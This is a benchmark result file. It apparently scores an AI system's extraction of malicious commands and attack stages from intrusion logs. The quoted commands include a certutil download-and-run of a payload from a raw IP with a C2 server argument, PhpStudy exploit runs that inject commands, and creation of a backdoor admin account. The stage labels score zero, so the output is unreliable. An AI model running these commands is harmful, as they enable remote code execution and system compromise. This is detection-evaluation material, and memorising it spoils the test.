@@ -1,0 +1,86 @@
+{
+  "output": {
+    "malicious_events": [
+      {
+        "command": "taskkill.exe /f /im agent.exe",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "certutil -urlcache -split -f http://124.223.85.207:8079/sangforcat.exe C:\\Users\\Public\\agent.exe",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "cmd /c start /min C:\\Users\\Public\\agent.exe -opid 7fa51253-c053-4b44-94eb-5d8a161b429b -server https://124.223.85.207:8443",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "cmd /c python PhpStudyPoc.py http://121.36.30.176/",
+        "stage": "Collection"
+      },
+      {
+        "command": "cmd /c 'python PhpStudyExp2.py http://121.36.30.176/ \"whoami&arp -a&ipconfig&ping www.baidu.com -c 1\"'",
+        "stage": "Discovery"
+      },
+      {
+        "command": "cmd /c 'python PhpStudyExp2.py http://121.36.30.176/ \"taskkill /f /im agent.exe&certutil -urlcache -split -f http://124.223.85.207:8079/sangforcat.exe C:\\Users\\Public\\agent.exe&cmd /c start /min C:\\Users\\Public\\agent.exe -opid 7fa51253-c053-4b44-94eb-5d8a161b429b -server https://124.223.85.207:8443\"'",
+        "stage": "Lateral Movement"
+      },
+      {
+        "command": "cmd /c ",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "net user nbb nb123. /add & net localgroup administrators nbb /add",
+        "stage": "Privilege Escalation"
+      },
+      {
+        "command": "cmd /c ",
+        "stage": "Credential Access"
+      }
+    ],
+    "narrative": "The attackers initially gained access via an HTTP request to download a payload ('certutil.exe -urlcache -split'). They then executed this payload using 'cmd.exe' to establish persistence through the 'agent.exe'. The attacker also attempted lateral movement by executing Python scripts over HTTP connections, likely to gather sensitive information or execute commands remotely. The attacker escalated privileges locally by adding a new administrative user. During these actions, various defensive mechanisms were evaded, such as obfuscating commands. Malware was dropped and spread across different directories.",
+    "_parse_ok": true,
+    "_cost": {
+      "llm_calls": 4,
+      "prompt_tokens": 82999,
+      "completion_tokens": 2461,
+      "total_tokens": 85460,
+      "wall_clock_s": 14.657,
+      "parse_retries": 0
+    }
+  },
+  "score": {
+    "event": {
+      "precision": 0.3333333333333333,
+      "recall": 0.42857142857142855,
+      "f1": 0.375,
+      "tp": 3,
+      "fp": 6,
+      "fn": 4
+    },
+    "stage": {
+      "precision": 0.0,
+      "recall": 0.0,
+      "f1": 0.0,
+      "tp": 0,
+      "fp": 9,
+      "fn": 6,
+      "recall_partial": 0.16666666666666666
+    },
+    "hallucination_rate": 0.0,
+    "cost": {
+      "llm_calls": 4,
+      "prompt_tokens": 82999,
+      "completion_tokens": 2461,
+      "total_tokens": 85460,
+      "wall_clock_s": 14.657,
+      "parse_retries": 0
+    }
+  },
+  "meta": {
+    "variant": "v3_stagedefs",
+    "max_tokens": 4096,
+    "prompt_variant": "stagedefs",
+    "gpu": "NVIDIA A100 80GB PCIe"
+  }
+}
